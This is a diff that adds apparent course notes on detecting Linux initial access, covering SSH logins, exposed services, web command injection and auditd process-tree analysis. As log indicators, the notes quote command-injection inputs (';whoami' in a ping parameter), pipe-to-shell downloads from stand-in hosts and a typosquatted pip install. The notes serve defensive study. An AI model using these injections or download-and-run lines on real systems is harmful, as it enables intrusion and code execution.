@@ -1,0 +1,164 @@
+# Linux Threat Detection 1
+
+## Overview
+Linux servers are frequent targets due to widespread exposure of services like SSH and web applications.
+Most Linux breaches still begin with **well-known Initial Access techniques** that are detectable via logs and process analysis.
+
+## Learning Objectives
+- Understand SSH risks in Linux environments
+- Detect breaches via Internet-exposed services
+- Use **process tree analysis** to trace attack origins
+- Practice identifying Initial Access techniques using logs
+
+---
+
+## SSH as Initial Access (MITRE: External Remote Services)
+- SSH is enabled on most Internet-facing Linux servers (40M+ exposed in 2025).
+- Common attack methods:
+  - **Brute-force password attacks**
+  - **Stolen SSH private keys**
+
+### Key-Based Authentication Risks
+- Private keys stored in:
+  - GitHub repos
+  - Automation servers (Ansible, CI/CD)
+- Admin workstation infected → SSH keys stolen
+
+### Password-Based Authentication Risks
+- Weak or temporary passwords left enabled
+- Contractors using trivial passwords
+- Old SSH servers accidentally exposed
+
+### SSH Breach Indicators (auth.log)
+- Multiple failed logins followed by success
+- Password-based authentication
+- External / unusual source IPs
+- Logins at abnormal times
+
+#### Example Command
+```bash
+cat /var/log/auth.log | grep -E 'Accepted'
+```
+
+### Analysis Tips
+- Validate username ownership
+- Check if source IP is trusted
+- Look for brute-force attempts before success
+- Investigate post-login activity
+
+---
+
+## Initial Access via Public Services (MITRE: T1190)
+Linux hosts often run exposed services:
+- Web servers
+- Mail servers
+- Databases
+- VPNs / Firewalls
+
+### Real-World Examples
+- Zimbra RCE CVE → OS command execution
+- Exposed Docker API → cloud breaches
+- Firewall CVEs → full OS compromise
+- WordPress plugins → web shell uploads
+
+---
+
+## Web Applications as Initial Access
+Public web apps can enable command injection.
+
+### Example: TryPingMe Vulnerability
+Backend executes:
+```bash
+ping -c 2 [USER_INPUT]
+```
+
+### Nginx Log Indicators
+- Commands in URL parameters
+- Use of `;`, `whoami`, `ls`, etc.
+
+```text
+GET /ping?host=;whoami
+GET /ping?host=;ls
+```
+
+### Conclusions from Web Logs
+- Attacker IP identified
+- Application allows OS command execution
+- Full system compromise possible
+
+---
+
+## Process Tree Analysis (Core SOC Skill)
+Used when application logs are insufficient.
+
+### Goal
+Trace suspicious commands back to:
+- A user (SSH)
+- A service (web app, script)
+- An automated process
+
+### Common Trigger
+- Alert on suspicious command (e.g., `whoami`, `curl`, `bash`)
+
+---
+
+## auditd Process Tree Example
+
+### Step 1: Find suspicious command
+```bash
+ausearch -i -x whoami
+```
+
+### Step 2: Trace parent process
+```bash
+ausearch -i --pid <PPID>
+```
+
+### Step 3: Reach root process
+- Command traced back to:
+```text
+/usr/bin/python3 /opt/mywebapp/app.py
+```
+
+### Step 4: Enumerate child processes
+```bash
+ausearch -i --ppid <PID> | grep proctitle
+```
+
+#### Malicious Indicators
+- `curl http://malicious | sh`
+- Arbitrary shell commands from app process
+
+---
+
+## Human-Led & Supply Chain Attacks
+
+### Human Error Examples
+- Running unverified scripts:
+```bash
+curl https://shady.site/script.sh | bash
+```
+- Typosquatting packages:
+```bash
+pip3 install fastpi
+```
+
+### Supply Chain Compromise
+- Backdoored XZ Utils (affecting SSH)
+- Compromised GitHub Actions leaking secrets
+
+---
+
+## Detection Strategy Summary
+1. Start with a trigger (alert, suspicious command, IP)
+2. Build a **process tree**
+3. Identify initiating user or service
+4. Decide if activity is legitimate or malicious
+
+---
+
+## Key Takeaways
+- SSH attacks are common and detectable via auth logs
+- Exposed services are high-risk entry points
+- Process tree analysis is essential for Initial Access detection
+- Human and supply chain attacks remain a threat on Linux
